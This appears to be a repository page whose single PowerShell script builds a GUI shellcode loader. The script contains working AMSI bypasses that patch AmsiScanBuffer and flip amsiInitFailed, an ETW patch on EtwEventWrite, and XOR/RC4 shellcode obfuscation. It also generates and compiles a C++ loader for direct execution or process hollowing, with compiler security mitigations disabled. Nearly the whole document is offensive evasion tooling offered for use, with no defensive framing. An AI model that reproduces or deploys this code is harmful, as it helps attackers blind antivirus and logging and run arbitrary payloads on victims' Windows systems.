# psgui
psgui

```
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Create main form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Shellcode Loader with AMSI Bypass"
$form.Size = New-Object System.Drawing.Size(800, 600)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

# Tab control for organization
$tabControl = New-Object System.Windows.Forms.TabControl
$tabControl.Location = New-Object System.Drawing.Point(10, 10)
$tabControl.Size = New-Object System.Drawing.Size(760, 520)
$tabControl.Anchor = "Top, Bottom, Left, Right"

# Tab 1: Main Configuration
$tabPage1 = New-Object System.Windows.Forms.TabPage
$tabPage1.Text = "Configuration"
$tabControl.Controls.Add($tabPage1)

# Shellcode file selection
$labelShellcode = New-Object System.Windows.Forms.Label
$labelShellcode.Location = New-Object System.Drawing.Point(20, 20)
$labelShellcode.Size = New-Object System.Drawing.Size(150, 20)
$labelShellcode.Text = "Shellcode File:"
$tabPage1.Controls.Add($labelShellcode)

$textBoxShellcode = New-Object System.Windows.Forms.TextBox
$textBoxShellcode.Location = New-Object System.Drawing.Point(20, 45)
$textBoxShellcode.Size = New-Object System.Drawing.Size(500, 20)
$tabPage1.Controls.Add($textBoxShellcode)

$buttonBrowse = New-Object System.Windows.Forms.Button
$buttonBrowse.Location = New-Object System.Drawing.Point(530, 43)
$buttonBrowse.Size = New-Object System.Drawing.Size(75, 23)
$buttonBrowse.Text = "Browse..."
$buttonBrowse.Add_Click({
    $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog
    $openFileDialog.Filter = "Binary files (*.bin)|*.bin|All files (*.*)|*.*"
    if ($openFileDialog.ShowDialog() -eq "OK") {
        $textBoxShellcode.Text = $openFileDialog.FileName
    }
})
$tabPage1.Controls.Add($buttonBrowse)

# Execution Method
$labelMethod = New-Object System.Windows.Forms.Label
$labelMethod.Location = New-Object System.Drawing.Point(20, 80)
$labelMethod.Size = New-Object System.Drawing.Size(150, 20)
$labelMethod.Text = "Execution Method:"
$tabPage1.Controls.Add($labelMethod)

$comboMethod = New-Object System.Windows.Forms.ComboBox
$comboMethod.Location = New-Object System.Drawing.Point(20, 105)
$comboMethod.Size = New-Object System.Drawing.Size(200, 20)
$comboMethod.Items.AddRange(@("Direct Execution", "Process Hollowing", "Early Bird APC", "Thread Hijacking"))
$comboMethod.SelectedIndex = 0
$tabPage1.Controls.Add($comboMethod)

# Target Process (for hollowing)
$labelTarget = New-Object System.Windows.Forms.Label
$labelTarget.Location = New-Object System.Drawing.Point(240, 80)
$labelTarget.Size = New-Object System.Drawing.Size(150, 20)
$labelTarget.Text = "Target Process:"
$tabPage1.Controls.Add($labelTarget)

$textBoxTarget = New-Object System.Windows.Forms.TextBox
$textBoxTarget.Location = New-Object System.Drawing.Point(240, 105)
$textBoxTarget.Size = New-Object System.Drawing.Size(150, 20)
$textBoxTarget.Text = "notepad.exe"
$textBoxTarget.Enabled = $false
$tabPage1.Controls.Add($textBoxTarget)

$comboMethod.Add_SelectedIndexChanged({
    $textBoxTarget.Enabled = ($comboMethod.SelectedIndex -eq 1)
})

# Checkboxes for options
$checkBoxAMSI = New-Object System.Windows.Forms.CheckBox
$checkBoxAMSI.Location = New-Object System.Drawing.Point(20, 150)
$checkBoxAMSI.Size = New-Object System.Drawing.Size(200, 20)
$checkBoxAMSI.Text = "Bypass AMSI"
$checkBoxAMSI.Checked = $true
$tabPage1.Controls.Add($checkBoxAMSI)

$checkBoxETW = New-Object System.Windows.Forms.CheckBox
$checkBoxETW.Location = New-Object System.Drawing.Point(20, 180)
$checkBoxETW.Size = New-Object System.Drawing.Size(200, 20)
$checkBoxETW.Text = "Bypass ETW"
$checkBoxETW.Checked = $true
$tabPage1.Controls.Add($checkBoxETW)

$checkBoxUnhook = New-Object System.Windows.Forms.CheckBox
$checkBoxUnhook.Location = New-Object System.Drawing.Point(20, 210)
$checkBoxUnhook.Size = New-Object System.Drawing.Size(200, 20)
$checkBoxUnhook.Text = "Unhook DLLs"
$checkBoxUnhook.Checked = $true
$tabPage1.Controls.Add($checkBoxUnhook)

$checkBoxObfuscate = New-Object System.Windows.Forms.CheckBox
$checkBoxObfuscate.Location = New-Object System.Drawing.Point(20, 240)
$checkBoxObfuscate.Size = New-Object System.Drawing.Size(200, 20)
$checkBoxObfuscate.Text = "Obfuscate Shellcode"
$checkBoxObfuscate.Checked = $false
$tabPage1.Controls.Add($checkBoxObfuscate)

# Compiler Selection
$labelCompiler = New-Object System.Windows.Forms.Label
$labelCompiler.Location = New-Object System.Drawing.Point(20, 280)
$labelCompiler.Size = New-Object System.Drawing.Size(150, 20)
$labelCompiler.Text = "Compiler Path:"
$tabPage1.Controls.Add($labelCompiler)

$comboCompiler = New-Object System.Windows.Forms.ComboBox
$comboCompiler.Location = New-Object System.Drawing.Point(20, 305)
$comboCompiler.Size = New-Object System.Drawing.Size(500, 20)
$comboCompiler.Items.AddRange(@(
    "C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\bin\Hostx64\x64\cl.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\bin\Hostx64\x64\cl.exe"
))
$comboCompiler.SelectedIndex = 0
$comboCompiler.DropDownStyle = "DropDown"
$tabPage1.Controls.Add($comboCompiler)

# Tab 2: Advanced Options
$tabPage2 = New-Object System.Windows.Forms.TabPage
$tabPage2.Text = "Advanced"
$tabControl.Controls.Add($tabPage2)

# Encryption Options
$labelEncryption = New-Object System.Windows.Forms.Label
$labelEncryption.Location = New-Object System.Drawing.Point(20, 20)
$labelEncryption.Size = New-Object System.Drawing.Size(150, 20)
$labelEncryption.Text = "Encryption Type:"
$tabPage2.Controls.Add($labelEncryption)

$comboEncryption = New-Object System.Windows.Forms.ComboBox
$comboEncryption.Location = New-Object System.Drawing.Point(20, 45)
$comboEncryption.Size = New-Object System.Drawing.Size(200, 20)
$comboEncryption.Items.AddRange(@("None", "XOR", "RC4", "AES"))
$comboEncryption.SelectedIndex = 0
$tabPage2.Controls.Add($comboEncryption)

# XOR Key
$labelXORKey = New-Object System.Windows.Forms.Label
$labelXORKey.Location = New-Object System.Drawing.Point(240, 20)
$labelXORKey.Size = New-Object System.Drawing.Size(100, 20)
$labelXORKey.Text = "XOR Key:"
$tabPage2.Controls.Add($labelXORKey)

$textBoxXORKey = New-Object System.Windows.Forms.TextBox
$textBoxXORKey.Location = New-Object System.Drawing.Point(240, 45)
$textBoxXORKey.Size = New-Object System.Drawing.Size(100, 20)
$textBoxXORKey.Text = "0xAA"
$tabPage2.Controls.Add($textBoxXORKey)

# Output Options
$labelOutput = New-Object System.Windows.Forms.Label
$labelOutput.Location = New-Object System.Drawing.Point(20, 80)
$labelOutput.Size = New-Object System.Drawing.Size(150, 20)
$labelOutput.Text = "Output Directory:"
$tabPage2.Controls.Add($labelOutput)

$textBoxOutput = New-Object System.Windows.Forms.TextBox
$textBoxOutput.Location = New-Object System.Drawing.Point(20, 105)
$textBoxOutput.Size = New-Object System.Drawing.Size(500, 20)
$textBoxOutput.Text = [System.IO.Path]::GetTempPath()
$tabPage2.Controls.Add($textBoxOutput)

$buttonOutputBrowse = New-Object System.Windows.Forms.Button
$buttonOutputBrowse.Location = New-Object System.Drawing.Point(530, 103)
$buttonOutputBrowse.Size = New-Object System.Drawing.Size(75, 23)
$buttonOutputBrowse.Text = "Browse..."
$buttonOutputBrowse.Add_Click({
    $folderDialog = New-Object System.Windows.Forms.FolderBrowserDialog
    if ($folderDialog.ShowDialog() -eq "OK") {
        $textBoxOutput.Text = $folderDialog.SelectedPath
    }
})
$tabPage2.Controls.Add($buttonOutputBrowse)

# Tab 3: Log/Output
$tabPage3 = New-Object System.Windows.Forms.TabPage
$tabPage3.Text = "Output"
$tabControl.Controls.Add($tabPage3)

$textBoxOutputLog = New-Object System.Windows.Forms.TextBox
$textBoxOutputLog.Location = New-Object System.Drawing.Point(10, 10)
$textBoxOutputLog.Size = New-Object System.Drawing.Size(720, 450)
$textBoxOutputLog.Multiline = $true
$textBoxOutputLog.ScrollBars = "Both"
$textBoxOutputLog.ReadOnly = $true
$tabPage3.Controls.Add($textBoxOutputLog)

# Status bar
$statusBar = New-Object System.Windows.Forms.StatusBar
$statusBar.Text = "Ready"
$form.Controls.Add($statusBar)

# Progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(10, 540)
$progressBar.Size = New-Object System.Drawing.Size(680, 20)
$progressBar.Style = "Marquee"
$progressBar.Visible = $false
$form.Controls.Add($progressBar)

# Buttons
$buttonExecute = New-Object System.Windows.Forms.Button
$buttonExecute.Location = New-Object System.Drawing.Point(600, 540)
$buttonExecute.Size = New-Object System.Drawing.Size(75, 23)
$buttonExecute.Text = "Execute"
$buttonExecute.Add_Click({
    Execute-ShellcodeLoader
})
$form.Controls.Add($buttonExecute)

$buttonCancel = New-Object System.Windows.Forms.Button
$buttonCancel.Location = New-Object System.Drawing.Point(700, 540)
$buttonCancel.Size = New-Object System.Drawing.Size(75, 23)
$buttonCancel.Text = "Cancel"
$buttonCancel.Add_Click({
    $form.Close()
})
$form.Controls.Add($buttonCancel)

$form.Controls.Add($tabControl)

# Function to add log messages
function Add-Log {
    param([string]$Message)
    
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    
    $textBoxOutputLog.AppendText("$logMessage`r`n")
    $textBoxOutputLog.SelectionStart = $textBoxOutputLog.Text.Length
    $textBoxOutputLog.ScrollToCaret()
    
    $statusBar.Text = $Message
}

# AMSI Bypass Function
function Bypass-AMSI {
    Add-Log "Attempting AMSI bypass..."
    
    # Multiple AMSI bypass techniques
    $amsiBypasses = @'
    # Technique 1
    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if($b.Name -like "*iutils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

    # Technique 2
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

    # Technique 3
    $win32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $win32
    $ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    $oldProtection = 0
    [Win32]::VirtualProtect($ptr, [uint32]5, 0x40, [ref]$oldProtection)
    $buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)
'@

    try {
        Invoke-Expression $amsiBypasses
        Add-Log "AMSI bypass successful"
        return $true
    }
    catch {
        Add-Log "AMSI bypass failed: $_"
        return $false
    }
}

# ETW Bypass Function
function Bypass-ETW {
    Add-Log "Attempting ETW bypass..."
    
    $etwBypass = @'
    # Patch EtwEventWrite
    $Signature = @"
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
"@
    
    $Kernel32 = Add-Type -MemberDefinition $Signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    
    $hModule = $Kernel32::GetModuleHandle("ntdll.dll")
    $pFunc = $Kernel32::GetProcAddress($hModule, "EtwEventWrite")
    
    $oldProtection = 0
    $Kernel32::VirtualProtect($pFunc, [uint32]5, 0x40, [ref]$oldProtection)
    
    $patch = [Byte[]] (0xC3)
    $Kernel32::WriteProcessMemory([System.Diagnostics.Process]::GetCurrentProcess().Handle, $pFunc, $patch, 1, [ref][UIntPtr]::Zero)
'@

    try {
        Invoke-Expression $etwBypass
        Add-Log "ETW bypass successful"
        return $true
    }
    catch {
        Add-Log "ETW bypass failed: $_"
        return $false
    }
}

# Obfuscate Shellcode
function Obfuscate-Shellcode {
    param(
        [byte[]]$Shellcode,
        [string]$Method,
        [string]$Key
    )
    
    $obfuscated = $Shellcode.Clone()
    
    switch ($Method) {
        "XOR" {
            $xorKey = [byte]$Key
            for ($i = 0; $i -lt $obfuscated.Length; $i++) {
                $obfuscated[$i] = $obfuscated[$i] -bxor $xorKey
            }
            Add-Log "XOR obfuscation applied with key: $xorKey"
        }
        "RC4" {
            # Simple RC4 implementation for demonstration
            $s = 0..255
            $j = 0
            $keyBytes = [System.Text.Encoding]::ASCII.GetBytes($Key)
            
            for ($i = 0; $i -lt 256; $i++) {
                $j = ($j + $s[$i] + $keyBytes[$i % $keyBytes.Length]) % 256
                $temp = $s[$i]
                $s[$i] = $s[$j]
                $s[$j] = $temp
            }
            
            $i = $j = 0
            for ($k = 0; $k -lt $obfuscated.Length; $k++) {
                $i = ($i + 1) % 256
                $j = ($j + $s[$i]) % 256
                $temp = $s[$i]
                $s[$i] = $s[$j]
                $s[$j] = $temp
                $t = ($s[$i] + $s[$j]) % 256
                $obfuscated[$k] = $obfuscated[$k] -bxor $s[$t]
            }
            Add-Log "RC4 encryption applied"
        }
    }
    
    return $obfuscated
}

# Generate C++ Loader Code
function Generate-CppLoader {
    param(
        [byte[]]$Shellcode,
        [string]$Method,
        [string]$TargetProcess,
        [bool]$Unhook,
        [string]$Encryption
    )
    
    $loaderTemplate = @"
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSYSAPI NTSTATUS NTAPI NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Shellcode
unsigned char shellcode[] = { $(($Shellcode -join ', ')) };
size_t shellcode_size = sizeof(shellcode);

// Unhooking function
void UnhookDLL(const char* dllName) {
    HMODULE hModule = GetModuleHandleA(dllName);
    if (hModule == NULL) return;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    
    // Simple unhooking by restoring original headers
    // Note: This is a simplified version
}

// Process hollowing
BOOL ProcessHollowing(const char* targetProcess, unsigned char* shellcode, size_t size) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    LPVOID remoteImageBase = NULL;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 8), &remoteImageBase, sizeof(LPVOID), NULL);
    
    // Unmap original executable
    ZwUnmapViewOfSection(pi.hProcess, remoteImageBase);
    
    // Allocate new memory and write shellcode
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, size, NULL);
    
    // Update entry point
    ctx.Eax = (DWORD)remoteMemory;
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

// Direct execution
void DirectExecution(unsigned char* shellcode, size_t size) {
    LPVOID execMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) return;
    
    memcpy(execMemory, shellcode, size);
    
    // Create thread to execute shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFree(execMemory, 0, MEM_RELEASE);
}

int main() {
    // Unhook if needed
    $(if ($Unhook) { "UnhookDLL(\"ntdll.dll\");" })
    
    // Execute based on method
    $(switch ($Method) {
        "Process Hollowing" { 
            "if (!ProcessHollowing(`"$TargetProcess`", shellcode, shellcode_size)) { return 1; }" 
        }
        "Direct Execution" { 
            "DirectExecution(shellcode, shellcode_size);" 
        }
        default { 
            "DirectExecution(shellcode, shellcode_size);" 
        }
    })
    
    return 0;
}
"@
    
    return $loaderTemplate
}

# Main execution function
function Execute-ShellcodeLoader {
    # Reset UI
    $progressBar.Visible = $true
    $textBoxOutputLog.Clear()
    $buttonExecute.Enabled = $false
    
    try {
        # Validate inputs
        if ([string]::IsNullOrEmpty($textBoxShellcode.Text) -or !(Test-Path $textBoxShellcode.Text)) {
            [System.Windows.Forms.MessageBox]::Show("Please select a valid shellcode file.", "Error", "OK", "Error")
            return
        }
        
        Add-Log "Starting shellcode loader..."
        
        # Apply bypasses if selected
        if ($checkBoxAMSI.Checked) {
            Bypass-AMSI | Out-Null
        }
        
        if ($checkBoxETW.Checked) {
            Bypass-ETW | Out-Null
        }
        
        # Read and optionally obfuscate shellcode
        Add-Log "Reading shellcode file..."
        $shellcodeBytes = [System.IO.File]::ReadAllBytes($textBoxShellcode.Text)
        Add-Log "Shellcode size: $($shellcodeBytes.Length) bytes"
        
        if ($checkBoxObfuscate.Checked -and $comboEncryption.SelectedItem -ne "None") {
            $shellcodeBytes = Obfuscate-Shellcode -Shellcode $shellcodeBytes -Method $comboEncryption.SelectedItem -Key $textBoxXORKey.Text
        }
        
        # Generate C++ code
        Add-Log "Generating C++ loader code..."
        $cppCode = Generate-CppLoader -Shellcode $shellcodeBytes `
                                      -Method $comboMethod.SelectedItem `
                                      -TargetProcess $textBoxTarget.Text `
                                      -Unhook $checkBoxUnhook.Checked `
                                      -Encryption $comboEncryption.SelectedItem
        
        # Check compiler
        $compilerPath = $comboCompiler.Text
        if (!(Test-Path $compilerPath)) {
            Add-Log "Compiler not found. Searching for alternatives..."
            
            # Try to find compiler automatically
            $possiblePaths = @(
                "C:\Program Files (x86)\Microsoft Visual Studio\*\Community\VC\Tools\MSVC\*\bin\Hostx64\x64\cl.exe",
                "C:\Program Files (x86)\Microsoft Visual Studio\*\Professional\VC\Tools\MSVC\*\bin\Hostx64\x64\cl.exe",
                "C:\Program Files (x86)\Microsoft Visual Studio\*\BuildTools\VC\Tools\MSVC\*\bin\Hostx64\x64\cl.exe"
            )
            
            $foundCompiler = $false
            foreach ($path in $possiblePaths) {
                $compilers = Get-ChildItem -Path $path -ErrorAction SilentlyContinue
                if ($compilers) {
                    $compilerPath = $compilers[0].FullName
                    Add-Log "Found compiler: $compilerPath"
                    $foundCompiler = $true
                    break
                }
            }
            
            if (!$foundCompiler) {
                throw "No Visual Studio compiler found. Please install Visual Studio Build Tools."
            }
        }
        
        # Create temporary files
        $tempDir = $textBoxOutput.Text
        if ([string]::IsNullOrEmpty($tempDir)) {
            $tempDir = [System.IO.Path]::GetTempPath()
        }
        
        $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
        $cppFile = Join-Path $tempDir "$randomName.cpp"
        $exeFile = Join-Path $tempDir "$randomName.exe"
        
        Add-Log "Writing C++ source to: $cppFile"
        [System.IO.File]::WriteAllText($cppFile, $cppCode)
        
        # Compile
        Add-Log "Compiling with: $compilerPath"
        
        $compileArgs = @(
            "/nologo",
            "/GS-",
            "/sdl-",
            "/guard:cf-",
            "/DYNAMICBASE:NO",
            "/NXCOMPAT:NO",
            "/O2",
            "/MT",
            "$cppFile",
            "/link",
            "/DYNAMICBASE:NO",
            "/NXCOMPAT:NO",
            "/SUBSYSTEM:CONSOLE",
            "/OUT:`"$exeFile`""
        ) -join " "
        
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $compilerPath
        $processInfo.Arguments = $compileArgs
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        $process.WaitForExit()
        
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        
        if ($stdout) { Add-Log "Compiler output: $stdout" }
        if ($stderr) { Add-Log "Compiler errors: $stderr" }
        
        if ($process.ExitCode -eq 0 -and (Test-Path $exeFile)) {
            Add-Log "Compilation successful: $exeFile"
            
            # Execute
            Add-Log "Executing loader..."
            
            if ($comboMethod.SelectedItem -eq "Process Hollowing") {
                Start-Process $exeFile -ArgumentList "-hollow $($textBoxTarget.Text)" -NoNewWindow
            } else {
                Start-Process $exeFile -NoNewWindow
            }
            
            Add-Log "Execution completed successfully!"
            
            # Cleanup option
            $cleanup = [System.Windows.Forms.MessageBox]::Show(
                "Do you want to cleanup temporary files?",
                "Cleanup",
                "YesNo",
                "Question"
            )
            
            if ($cleanup -eq "Yes") {
                Remove-Item $cppFile, $exeFile -Force -ErrorAction SilentlyContinue
                Add-Log "Temporary files cleaned up"
            }
            
        } else {
            throw "Compilation failed with exit code: $($process.ExitCode)"
        }
    }
    catch {
        Add-Log "ERROR: $_"
        [System.Windows.Forms.MessageBox]::Show(
            "An error occurred: $_",
            "Error",
            "OK",
            "Error"
        )
    }
    finally {
        $progressBar.Visible = $false
        $buttonExecute.Enabled = $true
        $statusBar.Text = "Ready"
    }
}

# Show form
[System.Windows.Forms.Application]::Run($form)

```
